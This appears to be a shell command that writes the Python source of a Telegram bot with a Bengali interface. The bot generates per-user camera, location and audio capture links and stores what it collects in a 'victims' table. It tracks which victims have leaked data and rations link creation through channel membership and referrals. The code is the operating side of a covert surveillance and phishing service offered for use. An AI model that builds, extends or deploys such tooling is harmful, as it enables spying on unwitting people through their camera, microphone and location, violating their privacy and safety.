cat > bot.py << 'BOTEOF'
import telebot
import random
import string
import time
import traceback
from datetime import datetime
from config import BOT_TOKEN, CHANNEL_USERNAME, BASE_URL, REQUIRED_REFS, FREE_LINKS
from database import db

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def gen_code(n=8):
    return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))

def check_ch(uid):
    try:
        m = bot.get_chat_member(CHANNEL_USERNAME, uid)
        return m.status in ('member','administrator','creator')
    except:
        return False

def msend(cid, txt, **kw):
    try: return bot.send_message(cid, txt, **kw)
    except: return None

def medit(cid, mid, txt, **kw):
    try: return bot.edit_message_text(txt, cid, mid, **kw)
    except: return None

def mk_kb():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("\U0001f195 \u09b2\u09bf\u0982\u0995", callback_data="a"),
        telebot.types.InlineKeyboardButton("\U0001f4cb \u09ae\u09be\u0987\u09a8", callback_data="b"),
        telebot.types.InlineKeyboardButton("\U0001f464 \u09aa\u09cd\u09b0\u09cb", callback_data="c"),
        telebot.types.InlineKeyboardButton("\U0001f517 \u09b0\u09c7\u09ab\u09be\u09b0", callback_data="d"),
        telebot.types.InlineKeyboardButton("\U0001f4ca \u09b8\u09cd\u099f\u09cd\u09af\u09be\u099f", callback_data="e"),
    )
    if CHANNEL_USERNAME:
        kb.add(telebot.types.InlineKeyboardButton("\U0001f4e2 \u099a\u09cd\u09af\u09be\u09a8\u09c7\u09b2", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
    return kb

def bk():
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("\U0001f519 \u09ae\u09c7\u09a8\u09c1", callback_data="m"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    un = m.from_user.username or 'User'
    fn = m.from_user.first_name or ''
    
    user = db.get_user(uid)
    new = False
    if not user:
        db.create_user(uid, un, fn)
        user = db.get_user(uid)
        new = True
    
    args = m.text.split()
    if len(args) > 1 and new:
        try:
            rid = int(args[1])
            if rid != uid and user and not user['referred_by']:
                if db.add_referral(rid, uid):
                    try:
                        ru = db.get_user(rid)
                        rn = ru['first_name'] or ru['username'] if ru else ''
                        bot.send_message(rid, f"\U0001f389 \u09b0\u09c7\u09ab\u09be\u09b0\u09c7\u09b2!\n{fn} (@{un}) joined!\nTotal: {db.get_user(rid)['refer_count']}")
                    except: pass
        except: pass
    
    if new:
        txt = f"\U0001f44b *\u09b8\u09cd\u09ac\u09be\u0997\u09a4\u09ae {fn}!*\n\u2705 {FREE_LINKS}\u099f\u09bf \u09ab\u09cd\u09b0\u09bf \u09b2\u09bf\u0982\u0995!\n\u09aa\u09cd\u09b0\u09a4\u09bf {REQUIRED_REFS} \u09b0\u09c7\u09ab\u09be\u09b0\u09c7\u09b2\u09c7 +\u09e7 \u09b2\u09bf\u0982\u0995\u0964"
    else:
        txt = f"\U0001f44b *\u09ab\u09bf\u09b0\u09c7 \u0986\u09b8\u09c1\u09a8 {fn}!*"
    msend(uid, txt, parse_mode='Markdown', reply_markup=mk_kb())

@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid = c.from_user.id
    d = c.data
    try:
        if d == 'm': medit(uid, c.message.message_id, '\U0001f916 \u09ae\u09c7\u09a8\u09c1', parse_mode='Markdown', reply_markup=mk_kb())
        elif d == 'c': profile(c)
        elif d == 'a': new_link(c)
        elif d == 'b': my_links(c)
        elif d == 'd': referral(c)
        elif d == 'e': stats(c)
        elif d.startswith('p'):
            try: my_links(c, int(d[1:]))
            except: pass
    except Exception as e:
        print(f"[CB ERR] {traceback.format_exc()}")
        bot.answer_callback_query(c.id, '\u09a4\u09cd\u09b0\u09c1\u099f\u09bf', show_alert=True)
    bot.answer_callback_query(c.id)

def profile(c):
    uid = c.from_user.id
    u = db.get_user(uid)
    if not u:
        medit(uid, c.message.message_id, '\u274c /start \u09a6\u09bf\u09a8', reply_markup=bk()); return
    ch = '\u2705' if check_ch(uid) else '\u274c'
    av = db.get_available_links(uid)
    vs = db.get_user_victims(uid)
    dc = sum(1 for v in vs if v['camera_data'] or v['location_data'] or v['audio_data'])
    txt = f'\U0001f464 \u09aa\u09cd\u09b0\u09cb\n\U0001f194 `{uid}`\n\U0001f464 {u["first_name"] or u["username"]}\n\U0001f4c5 {u["join_date"][:10]}\n\U0001f4e2 {ch}\n\U0001f465 \u09b0\u09c7\u09ab\u09be\u09b0\u09c7\u09b2: {u["refer_count"]}\n\U0001f3af \u09b2\u09bf\u0982\u0995: {u["total_links_created"]}\n\U0001f4e6 \u09ac\u09be\u0995\u09bf: {av}\n\u2705 \u09a1\u09be\u099f\u09be: {dc}'
    medit(uid, c.message.message_id, txt, parse_mode='Markdown', reply_markup=bk())

def new_link(c):
    uid = c.from_user.id
    if not check_ch(uid):
        medit(uid, c.message.message_id, f'\u274c \u099c\u09df\u09a8 \u0995\u09b0\u09c1\u09a8 {CHANNEL_USERNAME}', reply_markup=bk()); return
    if db.is_rate_limited(uid):
        medit(uid, c.message.message_id, '\u26a0\ufe0f \u09b0\u09c7\u099f \u09b2\u09bf\u09ae\u09bf\u099f! \u0998\u09a8\u09cd\u099f\u09be\u09af\u09bc max \u09eb\u099f\u09bf', reply_markup=bk()); return
    av = db.get_available_links(uid)
    if av <= 0:
        u = db.get_user(uid)
        r = REQUIRED_REFS - (u['refer_count'] % REQUIRED_REFS) if u else REQUIRED_REFS
        if r == REQUIRED_REFS: r = 0
        medit(uid, c.message.message_id, f'\u274c \u09b2\u09bf\u0982\u0995 \u09a8\u09be\u0987\u0964 \u0986\u09b0\u09cb {max(1,r)}\u099f\u09bf \u09b0\u09c7\u09ab\u09be\u09b0\u09c7\u09b2 \u0986\u09a8\u09c1\u09a8', reply_markup=mk_kb()); return
    code = gen_code()
    cu = f'{BASE_URL}/camera/{code}'
    lu = f'{BASE_URL}/location/{code}'
    au = f'{BASE_URL}/audio/{code}'
    if not db.create_victim(uid, code, cu, lu, au):
        medit(uid, c.message.message_id, '\u274c \u09ac\u09cd\u09af\u09b0\u09cd\u09a5', reply_markup=bk()); return
    txt = f'\u2705 \u09a8\u09a4\u09c1\u09a8!\n\U0001f194 `{code}`\n\U0001f4e6 \u09ac\u09be\u0995\u09bf: {av-1}\n\n\U0001f4f7 `{cu}`\n\U0001f4cd `{lu}`\n\U0001f3a4 `{au}`'
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton('\U0001f4cb \u09ae\u09be\u0987\u09a8', callback_data='b'))
    kb.add(telebot.types.InlineKeyboardButton('\U0001f519 \u09ae\u09c7\u09a8\u09c1', callback_data='m'))
    medit(uid, c.message.message_id, txt, parse_mode='Markdown', reply_markup=kb)

def my_links(c, page=0):
    uid = c.from_user.id
    pp = 5; off = page * pp
    vs = db.get_user_victims(uid, pp, off)
    db.c.execute("SELECT COUNT(*) FROM victims WHERE telegram_id=?", (uid,))
    total = db.c.fetchone()[0]
    tp = max(1, (total + pp - 1) // pp)
    if total == 0:
        medit(uid, c.message.message_id, '\u274c \u0995\u09cb\u09a8 \u09b2\u09bf\u0982\u0995 \u09a8\u09c7\u0987', reply_markup=mk_kb()); return
    txt = f'\U0001f4cb \u09b2\u09bf\u0982\u0995 (\u09aa\u09c3 {page+1}/{tp})\n\n'
    for v in vs:
        ic = []
        if v['camera_data']: ic.append('\U0001f4f7')
        if v['location_data']: ic.append('\U0001f4cd')
        if v['audio_data']: ic.append('\U0001f3a4')
        st = ' '.join(ic) if ic else '\u23f3'
        txt += f'`{v["victim_code"]}` {v["created_at"][:10]}\n   {st} \u09b9\u09bf\u099f:{v["access_count"]}\n\n'
    kb = telebot.types.InlineKeyboardMarkup()
    nav = []
    if page > 0: nav.append(telebot.types.InlineKeyboardButton('\u25c0\ufe0f', callback_data=f'p{page-1}'))
    if page < tp-1: nav.append(telebot.types.InlineKeyboardButton('\u25b6\ufe0f', callback_data=f'p{page+1}'))
    if nav: kb.row(*nav)
    kb.add(telebot.types.InlineKeyboardButton('\U0001f519 \u09ae\u09c7\u09a8\u09c1', callback_data='m'))
    medit(uid, c.message.message_id, txt, parse_mode='Markdown', reply_markup=kb)

def referral(c):
    uid = c.from_user.id
    bu = bot.get_me().username
    link = f'https://t.me/{bu}?start={uid}'
    u = db.get_user(uid)
    rc = u['refer_count'] if u else 0
    av = rc // REQUIRED_REFS
    r = REQUIRED_REFS - (rc % REQUIRED_REFS)
    if r == REQUIRED_REFS: r = 0
    txt = f'\U0001f517 \u09b0\u09c7\u09ab\u09be\u09b0\u09c7\u09b2\n`{link}`\n\U0001f465 {rc}\n\U0001f513 {av}\n\U0001f381 {FREE_LINKS}\n\U0001f4cc \u09ac\u09be\u0995\u09bf: {r}\u099f\u09bf'
    medit(uid, c.message.message_id, txt, parse_mode='Markdown', reply_markup=bk())

def stats(c):
    uid = c.from_user.id
    s = db.get_stats()
    txt = f'\U0001f4ca \u09b8\u09cd\u099f\u09cd\u09af\u09be\u099f\n\U0001f465 \u0987\u0989\u099c\u09be\u09b0: {s["users"]}\n\U0001f3af \u09ad\u09bf\u0995\u09cd\u099f\u09bf\u09ae: {s["victims"]}\n\U0001f4f7 {s["camera"]}\n\U0001f4cd {s["location"]}\n\U0001f3a4 {s["audio"]}'
    medit(uid, c.message.message_id, txt, reply_markup=bk())

def run():
    print('\U0001f916 Bot running...')
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
        except:
            time.sleep(3)

if __name__ == '__main__':
    run()
BOTEOF
